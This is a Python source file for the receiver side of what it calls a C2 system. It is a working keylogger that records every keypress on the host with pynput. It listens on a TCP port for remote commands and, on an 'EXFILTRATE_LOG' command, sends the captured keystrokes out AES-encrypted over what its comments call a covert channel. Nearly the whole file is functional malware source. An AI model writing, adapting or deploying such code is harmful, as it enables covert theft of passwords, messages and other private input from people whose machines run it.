import socket  # Import socket for networking communication
import argparse  # Import argparse for parsing command-line arguments
import time  # Import time for delays in execution
import threading  # Import threading to run keylogger separately
import os  # Import os for file operations
import atexit  # Import atexit to clean up before exit
from Crypto.Cipher import AES  # Import AES for encryption
from Crypto.Util.Padding import pad  # Import padding utility for AES
from Crypto.Random import get_random_bytes  # Import for generating random IV
from pynput import keyboard  # Import keyboard listener for keylogging

# Global flag to indicate if keylogger is running
keylogger_running = False


# Cleanup function to stop keylogger on exit
def cleanup():
    global keylogger_running
    if keylogger_running:
        print("\U0001F6D1 Stopping keylogger on exit...")
        keylogger_running = False


# Register the cleanup function to run when the script exits
atexit.register(cleanup)


# Function to encrypt data using AES in CBC mode
def encrypt_data(data, key):
    iv = get_random_bytes(AES.block_size)  # Generate a 16-byte IV (Initialization Vector)
    cipher = AES.new(key, AES.MODE_CBC, iv)  # Create AES cipher in CBC mode
    padded_data = pad(data, AES.block_size)  # Pad data to align with AES block size
    ct_bytes = cipher.encrypt(padded_data)  # Encrypt the padded data
    encrypted_data = iv + ct_bytes  # Prepend IV to the ciphertext
    print(
        f"\U0001F512 Encrypted data: {encrypted_data[:64]}... IV length: {len(iv)}, CT length: {len(ct_bytes)}")  # Debug output
    return encrypted_data


# Function to start the keylogger
def keylogger(log_file_path):
    global keylogger_running
    print("\U0001F50D Starting keylogger...")

    # Clear the log file at the start to avoid appending old data
    with open(log_file_path, "w") as log_file:
        log_file.write("")

    # Callback function triggered when a key is pressed
    def on_press(key):
        try:
            with open(log_file_path, "a") as log_file:
                log_file.write(f"{key}\n")  # Write each keypress to the log file
                log_file.flush()  # Flush the buffer to save changes immediately
                print(f"\U0001F511 Keylog: {key}")  # Debug output
        except Exception as e:
            print(f"⚠️ Error logging key: {e}")

    # Start the keyboard listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    # Keep the keylogger running while the flag is True
    while keylogger_running:
        time.sleep(1)  # Prevent excessive CPU usage

    # Stop the listener when the keylogger is stopped
    listener.stop()
    print("\U0001F6D1 Keylogger stopped.")


# Function to handle received commands
def handle_command(command, conn, log_file_path, encryption_key):
    global keylogger_running
    if command == "START_KEYLOGGER":
        if keylogger_running:
            conn.sendall(b"ERROR: Keylogger is already running.")
            return
        print("\U0001F511 Starting keylogger...")
        keylogger_running = True
        thread = threading.Thread(target=keylogger, args=(log_file_path,))
        thread.start()
        conn.sendall(b"ACK")

    elif command == "STOP_KEYLOGGER":
        if not keylogger_running:
            conn.sendall(b"ERROR: Keylogger is not running.")
            return
        print("\U0001F6D1 Stopping keylogger...")
        keylogger_running = False
        conn.sendall(b"ACK")

    elif command == "EXFILTRATE_LOG":
        if not os.path.exists(log_file_path):
            print("❌ No log file found!")
            conn.sendall(b"ERROR: No log file found.")
            return
        print("\U0001F4E4 Sending log file...")
        send_file(log_file_path, conn, encryption_key)
        try:
            conn.sendall(b"EOF")  # End of file signal
        except BrokenPipeError:
            print("❌ Error: Connection closed by peer.")
    elif command == "STOP_RECEIVER":
        print("\U0001F6D1 Stopping receiver...")
        conn.sendall(b"ACK")
        exit(0)

    else:
        print(f"❌ Unknown command: {command}")
        conn.sendall(b"NACK: Unknown command.")


# Function to receive commands and handle them
def receive_commands(listen_port, encryption_key):
    log_file_path = "/home/by/log.txt"  # Define the log file path

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("0.0.0.0", listen_port))  # Listen on all available network interfaces
        sock.listen(1)
        print(f"📡 Receiver listening on port {listen_port}...")

        while True:
            print("🔄 Waiting for connection...")
            conn, addr = sock.accept()
            print(f"✅ Connected to sender at {addr}")

            try:
                while True:
                    command = conn.recv(1024).decode().strip()
                    if not command:
                        break
                    print(f"📥 Received command: {command}")
                    handle_command(command, conn, log_file_path, encryption_key)
            except Exception as e:
                print(f"❌ Error in connection: {e}")
            finally:
                conn.close()
                print(f"🔒 Connection closed.")


# Function to send the log file in chunks over the TCP covert channel
def send_file(file_path, conn, encryption_key):
    try:
        with open(file_path, 'rb') as f:
            while True:
                chunk = f.read(1400 - AES.block_size)  # Ensure chunk size aligns with AES block size
                if not chunk:
                    break
                encrypted_chunk = encrypt_data(chunk, encryption_key)
                conn.sendall(encrypted_chunk)
                time.sleep(0.005)  # Avoid flooding
    except BrokenPipeError:
        print("❌ Error: Connection closed by peer.")
    except Exception as e:
        print(f"❌ Error sending file: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Receiver for C2 system")
    parser.add_argument("listen_port", type=int, help="Port to listen on")
    parser.add_argument("decryption_key", help="Hexadecimal AES decryption key")
    args = parser.parse_args()

    decryption_key = bytes.fromhex(args.decryption_key)
    receive_commands(args.listen_port, decryption_key)
